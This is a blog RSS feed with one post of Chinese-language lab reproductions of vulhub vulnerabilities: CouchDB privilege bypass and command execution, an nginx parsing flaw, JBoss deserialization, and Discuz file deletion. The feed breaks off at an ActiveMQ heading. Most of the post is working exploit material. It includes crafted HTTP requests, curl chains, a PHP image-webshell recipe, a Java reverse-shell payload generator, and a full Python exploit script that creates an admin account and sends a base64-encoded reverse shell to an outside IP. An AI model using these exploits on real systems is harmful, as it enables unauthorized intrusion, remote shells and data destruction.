<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>co0ontty</title>
    <description>Walking to Dalao。</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Sun, 16 Jun 2019 20:01:45 +0800</pubDate>
    <lastBuildDate>Sun, 16 Jun 2019 20:01:45 +0800</lastBuildDate>
    <generator>Jekyll v3.8.5</generator>
    
      <item>
        <title>vulhub漏洞复现</title>
        <description>&lt;h2 id=&quot;couchdb-垂直权限绕过漏洞cve-2017-12635&quot;&gt;Couchdb 垂直权限绕过漏洞（CVE-2017-12635）&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Path:couchdb/CVE-2017-12635&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;漏洞复现&quot;&gt;漏洞复现：&lt;/h3&gt;

&lt;h4 id=&quot;发送创建用户的请求包&quot;&gt;发送创建用户的请求包&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&quot;language-textile&quot;&gt;PUT /_users/org.couchdb.user:username HTTP/1.1

Host: your-ip:5984

Accept: */*

Accept-Language: en

User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

Connection: close

Content-Type: application/json

Content-Length: 96

{

  &quot;type&quot;: &quot;user&quot;,

  &quot;name&quot;: &quot;username&quot;,

  &quot;roles&quot;: [&quot;_admin&quot;],

  &quot;password&quot;: &quot;password&quot;

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;服务器返回错误，仅允许admin用户添加用户&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5cfe35326689f17529.png&quot; alt=&quot;5cfe35326689f17529&quot; /&gt;&lt;/p&gt;

&lt;p&gt;重复发送roles参数，成功绕过限制，创建用户&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-textile&quot;&gt;PUT /_users/org.couchdb.user:username HTTP/1.1

Host: your-ip:5984

Accept: */*

Accept-Language: en

User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

Connection: close

Content-Type: application/json

Content-Length: 111

{

  &quot;type&quot;: &quot;user&quot;,

  &quot;name&quot;: &quot;username&quot;,

  &quot;roles&quot;: [&quot;_admin&quot;],

  &quot;roles&quot;:[],

  &quot;password&quot;: &quot;password&quot;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;成功创建用户&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5cfe365ebd34e80865.png&quot; alt=&quot;5cfe365ebd34e80865&quot; /&gt;&lt;/p&gt;

&lt;p&gt;登陆成功&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5cfe364f25d8a64339.png&quot; alt=&quot;5cfe364f25d8a64339&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;couchdb-任意命令执行漏洞cve-2017-12636&quot;&gt;Couchdb 任意命令执行漏洞（CVE-2017-12636）&lt;/h2&gt;

&lt;h3 id=&quot;漏洞复现-1&quot;&gt;漏洞复现：&lt;/h3&gt;

&lt;h4 id=&quot;version-160&quot;&gt;Version 1.6.0&lt;/h4&gt;

&lt;p&gt;在CVE-2017-12635的基础上进行任意命令执行操作&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-textile&quot;&gt;curl -X PUT 'http://co0ontty:password@your-ip:5984/_config/query_servers/cmd' -d '&quot;id &amp;gt;/tmp/success&quot;'

curl -X PUT 'http://co0ontty:password@your-ip:5984/vultest'
curl -X PUT 'http://co0ontty:password@your-ip:5984/vultest/vul' -d '{&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;}'
curl -X POST 'http://co0ontty:password@your-ip:5984/vultest/_temp_view?limit=10' -d '{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}' -H 'Content-Type:application/json'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;其中 co0ontty:password为用户名和密码&lt;/p&gt;

&lt;p&gt;第一个请求是添加一个名字为&lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;query_servers&lt;/code&gt;，其中&lt;code class=&quot;highlighter-rouge&quot;&gt;id &amp;gt;/tmp/success&lt;/code&gt;为后面要执行的命令&lt;/p&gt;

&lt;p&gt;第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。&lt;/p&gt;

&lt;p&gt;第四个请求就是在这个Database里进行查询，因为我将language设置为&lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt;，这里就会用到我第一步里添加的名为&lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;query_servers&lt;/code&gt;，最后触发命令执行。&lt;/p&gt;

&lt;h4 id=&quot;version-210&quot;&gt;Version 2.1.0&lt;/h4&gt;

&lt;p&gt;Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问&lt;code class=&quot;highlighter-rouge&quot;&gt;/_membership&lt;/code&gt;即可：&lt;/p&gt;

&lt;p&gt;第一个请求修改为：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-textile&quot;&gt;curl -X PUT http://co0ontty:password@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '&quot;id &amp;gt;/tmp/success&quot;'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;第二、三个请求不变：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-textile&quot;&gt;curl -X PUT 'http://co0ontty:password@your-ip:5984/vultest'

curl -X PUT 'http://co0ontty:password@your-ip:5984/vultest/vul' -d '{&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;}'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;由于Couchdb 2.x删除了&lt;code class=&quot;highlighter-rouge&quot;&gt;_temp_view&lt;/code&gt;，所以我们为了触发&lt;code class=&quot;highlighter-rouge&quot;&gt;query_servers&lt;/code&gt;中定义的命令，需要添加一个&lt;code class=&quot;highlighter-rouge&quot;&gt;_view&lt;/code&gt;：&lt;/p&gt;

&lt;p&gt;第四个请求修改为：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-textile&quot;&gt;curl -X PUT http://co0ontty:password@your-ip:5984/vultest/_design/vul -d '{&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:{&quot;wooyun&quot;:{&quot;map&quot;:&quot;&quot;} },&quot;language&quot;:&quot;cmd&quot;}' -H &quot;Content-Type: application/json&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;增加&lt;code class=&quot;highlighter-rouge&quot;&gt;_view&lt;/code&gt;的同时即触发了&lt;code class=&quot;highlighter-rouge&quot;&gt;query_servers&lt;/code&gt;中的命令。&lt;/p&gt;

&lt;p&gt;也可以使用python将这一过程连贯运行，并得到反弹shell的效果&lt;/p&gt;

&lt;p&gt;补充：&lt;/p&gt;

&lt;p&gt;linux环境下可以通过下面这个命令实现反弹shell&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-textile&quot;&gt;sh -i &amp;gt;&amp;amp; /dev/tcp/47.102.143.147/222 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;/dev/[tcp|upd]/host/port是Linux设备里面比较特殊的文件，读取或写入相当于建立socket调用 
由于其特殊性，命令执行后依旧无法找到/dev/tcp目录更不要说下面的文件了&lt;br /&gt;
注意，这里”&amp;amp;”在Linux shell中表示后台运行，当然这里0&amp;gt;&amp;amp;1不是这样,对于&amp;amp;1更准确的说应该是文件描述符1,而1一般代表的就是STDOUT_FILENO&lt;/p&gt;

&lt;p&gt;2&amp;gt;&amp;amp;1形式用于重定向，2&amp;gt;表示错误重定向，&amp;amp;1表示标准输出；以ls &amp;gt;/dev/null 2&amp;gt;&amp;amp;1为例，2&amp;gt;&amp;amp;1是将标准出错重定向到标准输出，不过在这里又被重定向到了/dev/null这个无底洞里
这里有一个问题：为什么2&amp;gt;&amp;amp;1要写在后面，以command &amp;gt;file 2&amp;gt;&amp;amp;1为例，首先是command &amp;gt; file将标准输出重定向到file中， 2&amp;gt;&amp;amp;1 是标准错误拷贝了标准输出的行为，也就是同样被重定向到file中，最终结果就是标准输出和错误都被重定向到file中 
其实还有一个问题，既然2&amp;gt;表示错误重定向，那么0&amp;gt;表示什么呢？查阅资料发现在Linux下输入输出重定向有三个值，其中2已经说过是标准错误信息输出，那0则是标准输入，1则为标准输出了。说到这里，其实又引出了一个新的问题，我们知道&amp;lt;才是表示输入的，那为何这里却是如此形式，按说就应该是2了，或者说这里0就已经是输入了，然后直接使用&amp;gt;进行输出，不是很清楚请大牛指点啊&lt;/p&gt;

&lt;p&gt;exp.py:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;json&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests.auth&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HTTPBasicAuth&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'http://47.102.143.147:5984'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rb&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;sh -i &amp;gt;&amp;amp; /dev/tcp/47.102.143.147/222 0&amp;gt;&amp;amp;1&quot;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'application/json'&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# session.proxies = {
#     'http': 'http://127.0.0.1:8085'
# }
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/_users/org.couchdb.user:co0ontty'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'''{
  &quot;type&quot;: &quot;user&quot;,
  &quot;name&quot;: &quot;co0ontty&quot;,
  &quot;roles&quot;: [&quot;_admin&quot;],
  &quot;roles&quot;: [],
  &quot;password&quot;: &quot;co0ontty&quot;
}'''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HTTPBasicAuth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'co0ontty'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'co0ontty'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# print (session.auth)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;bash -c '{echo,&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s}|{base64,-d}|{bash,-i}'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# print (command)
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/_config/query_servers/cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/_membership'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'all_nodes'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/_node/{}/_config/query_servers/cmd'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/co0ontty'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/co0ontty/test'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'{&quot;_id&quot;: &quot;id&quot;}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/co0ontty/_temp_view?limit=10'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/co0ontty/_design/test'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'{&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:{&quot;co0ontty&quot;:{&quot;map&quot;:&quot;&quot;} },&quot;language&quot;:&quot;cmd&quot;}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;nginx解析漏洞&quot;&gt;NGINX解析漏洞&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Path:nginx/nginx_parsing_vulnerability&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;漏洞成因：用户配置不当造成的解析漏洞。&lt;/p&gt;

&lt;h3 id=&quot;漏洞复现-2&quot;&gt;漏洞复现：&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5cffa56981f5625236.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;制作php的图片马进行上传，利用解析漏洞将图片马当做php解析并运行。&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;copy &lt;/span&gt;1.jpg /a + shell.php /b shell.jpg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;上传图片马，获得上传后的文件物理路径，访问相应的web路径（&lt;a href=&quot;http://47.102.143.147/uploadfiles/f47454d1d3644127f42070181a8b9afc.jpg&quot;&gt;http://47.102.143.147/uploadfiles/f47454d1d3644127f42070181a8b9afc.jpg&lt;/a&gt;）获得图片&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5cffa665698a720426.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;利用解析漏洞访问（&lt;a href=&quot;http://47.102.143.147/uploadfiles/f47454d1d3644127f42070181a8b9afc.jpg/.php&quot;&gt;http://47.102.143.147/uploadfiles/f47454d1d3644127f42070181a8b9afc.jpg/.php&lt;/a&gt;）成功解析图片为php&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5cffa7499b31532778.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;jboss-5x6x-反序列化漏洞-cve-2017-12149&quot;&gt;JBoss 5.x/6.x 反序列化漏洞 （CVE-2017-12149）&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Path:jboss/CVE-2017-12149&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;漏洞成因：该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。&lt;/p&gt;

&lt;p&gt;在&lt;code class=&quot;highlighter-rouge&quot;&gt;/invoker/readonly&lt;/code&gt;请求中，服务器将用户提交的POST内容进行了Java反序列化&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5d005ee4c701964038.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;使用常规的Java反序列化漏洞的测试方法来复现该漏洞。&lt;/p&gt;

&lt;h3 id=&quot;漏洞复现-3&quot;&gt;漏洞复现：&lt;/h3&gt;

&lt;p&gt;访问&lt;a href=&quot;http://47.102.143.147:8080/invoker/readonly&quot;&gt;http://47.102.143.147:8080/invoker/readonly&lt;/a&gt;发现返回值为500，确定漏洞存在&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5d00eee777d7b74150.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;使用Java反序列化利用工具JavaDeserH2HC.zip（http://scan.javasec.cn/java/JavaDeserH2HC.zip） 生成poc.ser&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#编译运行&lt;/span&gt;
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
&lt;span class=&quot;c1&quot;&gt;#生成shell反弹poc&lt;/span&gt;
java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 47.102.143.147:222
使用curl向服务器发送POST请求（@filename,从文件中读取数据（包括换行符），将读取的数据进行URL编码，然后发送给HTTP服务器）
&lt;span class=&quot;nb&quot;&gt;curl &lt;/span&gt;http://47.102.143.147:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5d00edd1279f283233.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;discuzx-34-任意文件删除漏洞&quot;&gt;Discuz!X ≤3.4 任意文件删除漏洞&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Path:discuz/x3.4-arbitrary-deletion&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;漏洞复现-4&quot;&gt;漏洞复现：&lt;/h3&gt;

&lt;p&gt;登陆Discuz!X搭建的论坛，注册账号，在个人设置界面使用POST发送请求：&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;birthprovince&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=../../../&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;txt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;profilesubmit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;formhash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e3807b55&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中formhash的值为：
&lt;img src=&quot;/assets/img/posts/5d0334e5b240c14832.png&quot; alt=&quot;&quot; /&gt;
发送请求后即刻删除指定的文件:
&lt;img src=&quot;/assets/img/posts/5d0334e65501c75422.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;activemq-反序列化漏洞cve-2015-5254&quot;&gt;ActiveMQ 反序列化漏洞（CVE-2015-5254）&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Path:activemq/CVE-2015-5254&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;漏洞详情&quot;&gt;漏洞详情：&lt;/h3&gt;

